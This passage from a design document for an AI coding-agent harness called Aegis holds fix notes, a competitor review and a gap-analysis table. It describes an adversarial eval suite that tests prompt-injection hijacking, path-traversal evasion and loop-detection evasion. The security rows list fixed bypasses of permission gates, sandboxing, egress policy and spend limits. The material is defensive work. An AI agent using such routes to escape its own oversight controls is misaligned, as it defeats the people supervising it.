14. **Embedding provenance / prune-by-age / checkpoint scope** — `mem_vec`/`docs_vec` gained a `model` column (`embed.Embedder` gained `Model()`); a stored vector from a different model is excluded from cosine ranking rather than silently compared. `compaction.pruneStaleToolResults` now only prunes a `grep`/`glob`/`ls` dump once verified superseded by an identical later call (mirrors the existing `read_file` re-read check), not merely by turn age. Checkpoint capture now reaches subprocess-mode sub-agents: `SpawnConfig.CheckpointID` + `WorkerSpec.SessionDBPath` let the worker process open its own connection to the same session db and reconstruct an equivalent `Snapshotter`.
15. **Adversarial eval suite** — `internal/eval/adversarial_test.go` (new) extends the P9.1 harness (`GuardEvents`/`ExpectGuardFailureContains` added to `eval.go`) with four full-engine scenarios: a judge-adapter proving injected file content can't hijack the output guard, a permission rule proving a `./`-traversal evasion is still blocked, loop detection proving a nonce-varying tool call still trips, and the budget gate proving a stuck guard-retry loop still aborts.

Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).

</details>

---

## Appendix B — 2026-07 Landscape Review

What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.

**Claude Code** (the closest architectural relative):
- **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
- **Skills with progressive disclosure** — only skill *name + description* load at session start; the full body loads on invocation. Addressed by P4.3.
- **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
- **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
- **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
- **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.

**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP *tool* (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).

**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP *server* (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.

**Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.

**Convergent themes across all four:** (1) token efficiency as a first-class metric, (2) user-configurable lifecycle hooks, (3) lazy/progressive context loading (skills, tools, docs), (4) headless/programmatic operation with structured output, (5) forge integration that completes the loop (PR out the other end), (6) sandboxing that doesn't require Docker. Aegis has now closed 1, 2, 3, 5, and 6; A2A/MCP-server interop (P6.2/P6.3) is the remaining open convergent theme.

**Where Aegis was already at or ahead of parity** (no action needed): prompt-cache breakpoints in the Anthropic adapter; per-turn structured traces + cost budget enforcement; checkpoints/rewind + git rollback; output validation guard (LLM rubric + schema modes); cron scheduling; container sandbox matrix (Docker/Podman/WSL/Apple); ACP editor protocol; local-LLM-first provider posture; 17 security personas + contextual security policies (egress-then-write); audit trail.

---

## Appendix C — Gap Analysis

| # | Category | Gap | Present in | Severity | Status |
|---|----------|-----|-----------|----------|--------|
| 1 | Context efficiency | Skills fully injected into system prompt (no progressive disclosure) | Claude Code | High | ✅ P4.3 |
| 2 | Extensibility | No user-configurable lifecycle hooks | Claude Code, opencode | High | ✅ P4.4 |
| 3 | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading | Claude Code (ToolSearch) | High | ✅ P4.6 |
| 4 | Automation | Headless `aegis chat` emits plain text only | Claude Code, Codex | High | ✅ P4.5 |
| 5 | Safety | Local sandbox backend = no isolation | Codex CLI (default-on) | High | ✅ P4.7 |
| 6 | Workflow | Git tool stops at commit; no push / PR creation | Claude Code, Codex | High | ✅ P4.8 |
| 7 | Multi-agent | Subagents report up only; no shared task list or peer messaging | Claude Code Agent Teams | Medium | ✅ P5.1 |
| 8 | Tools | LSP tools = diagnostics + references only | opencode | Medium | ✅ P5.2 |
| 9 | Tools | Web search scrapes DuckDuckGo HTML | Gemini, Claude Code | Medium | ✅ P5.3 |
| 10 | Automation | No notification channel for detached sessions | Claude Code, Channels | Medium | ✅ P5.4 |
| 11 | TUI | No `@file#start-end` line-range syntax | opencode | Low | ✅ P5.5 |
| 12 | TUI | No draft stash across sessions | opencode | Low | ✅ P5.6 |
| 13 | Persistence | No mid-turn state persistence on crash | Crush, opencode | Low | ⬜ P6.1 |
| 14 | Interop | No A2A protocol; cannot act as an MCP server | ADK, Codex | Low | ⬜ P6.2/P6.3 |
| 15 | Extensibility | Bundles install from local path only | opencode plugin ecosystem | Low | ✅ P5.7 |
| 16 | Memory | Knowledge/longmem retrieval is BM25-only | Cursor, Devin | Low | ✅ P5.8 |
| 17 | Reliability | No provider failover | Aider (litellm routing) | Low | ✅ P5.9 |
| — | Context efficiency | No deterministic tool-result pruning before LLM compaction | Codex CLI (token efficiency) | Low | ✅ P6.4 |
| 18 | Security | MCP tools hardcode capability as `network`, bypassing permission gate in any mode | — (internal audit) | **Critical** | ✅ P7.1 |
| 19 | Security | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts | — (internal audit) | High | ✅ P7.2 |
| 20 | Security | Permission allow-rule glob matches whole command string, bypassed by shell chaining | — (internal audit) | High | ✅ P7.3 |
| 21 | Security | Sandbox backend silently fails open to unsandboxed exec | — (internal audit) | Medium | ✅ P7.4 |
| 22 | Security | Bundle persona can silently escalate session to `auto` mode | — (internal audit) | Medium | ✅ P7.5 |
| 23 | Security | No signature/checksum verification on git-URL bundle installs | opencode plugin registry | Medium | ✅ P7.6 |
| 24 | Security | Deny rules silently no-op for tools with non-standard argument fields | — (internal audit) | Low | ✅ P7.7 |
| 25 | Performance | Session store rewrites entire message/trace blob every turn — O(N²) over session life | — (internal audit) | High | ✅ P8.1 |
| 26 | Performance | Knowledge semantic search loads full corpus (vectors + bodies) per query | — (internal audit) | Medium | ✅ P8.2 |
| 27 | Performance | Swarm mailbox has no eviction, grows unbounded | — (internal audit) | Medium | ✅ P8.3 |
| 28 | Performance | Token estimation double-scans full conversation per turn (local models) | — (internal audit) | Medium | ✅ P8.4 |
| 29 | Performance | Memory relevance TF-IDF recomputed from scratch every call | — (internal audit) | Low-Med | ✅ P8.5 |
| 30 | Performance | Write/execute tool calls unnecessarily serialize concurrent reads | — (internal audit) | Low | ✅ P8.6 |
| 31 | Quality | No agent-behavior eval/regression harness | Codex, Claude Code (internal eval suites) | Medium | ✅ P9.1 |
| 32 | Quality | Zero test coverage in trace/logging/api/client packages | — (internal audit) | Medium | ✅ P9.2 |
| 33 | Security | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited) | — (service-interaction review) | **High** | ✅ P10.1 |
| 34 | Security | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env | — (service-interaction review) | **High** | ✅ P10.2 |
| 35 | Security | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary) | — (service-interaction review) | Medium | ✅ P10.3 |
| 36 | Quality | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent | — (service-interaction review) | Medium | ✅ P10.4 |
| 37 | Safety | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture | — (provider-budgeting comparison) | **High** | ✅ P10.5 |
| 38 | Security scanning | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran | — (scan review) | High | ✅ P11.1 |
| 39 | Security scanning | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle) | — (scan review) | Medium | ⬜ P11.5 |
| 40 | Security scanning | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity) | — (scan review) | Medium | ⬜ P11.6 |
| 41 | Security scanning | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated) | user request | High | ⬜ P11.7 |
| 42 | Security scanning | Single SAST engine (semgrep `auto`, unpinned); no SCA breadth (osv-scanner/grype) or SBOM | — (scan review) | Medium | ⬜ P11.3/P11.4 |
| 43 | Security scanning | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped | user request | High | ✅ P11.10 |
| 44 | Security scanning | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy | user request | High | ✅ P11.11 (CLI + `/security-config` TUI form) |

---

## Appendix D — Sources (2026-07-02 review)

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) · [Steering Claude Code: skills, hooks, subagents](https://claude.com/blog/steering-claude-code-skills-hooks-rules-subagents-and-more) · [Agent Teams / subagents guide](https://saascity.io/blog/claude-code-subagents-agent-teams-2026) · [Q1 2026 update roundup](https://www.mindstudio.ai/blog/claude-code-q1-2026-update-roundup)
- [opencode docs](https://opencode.ai/docs/) · [opencode LSP servers](https://opencode.ai/docs/lsp/) · [opencode internals deep-dive](https://cefboud.com/posts/coding-agents-internals-opencode-deepdive/)
- [Claude Code vs Codex vs Gemini CLI (2026)](https://www.deployhq.com/blog/comparing-claude-code-openai-codex-and-google-gemini-cli-which-ai-coding-assistant-is-right-for-your-deployment-workflow) · [System prompts compared](https://codex.danielvaughan.com/2026/04/19/system-prompts-compared-codex-gemini-claude-code/) · [Agent capabilities compared](https://www.aimadetools.com/blog/claude-code-vs-codex-vs-gemini-agents-2026/)
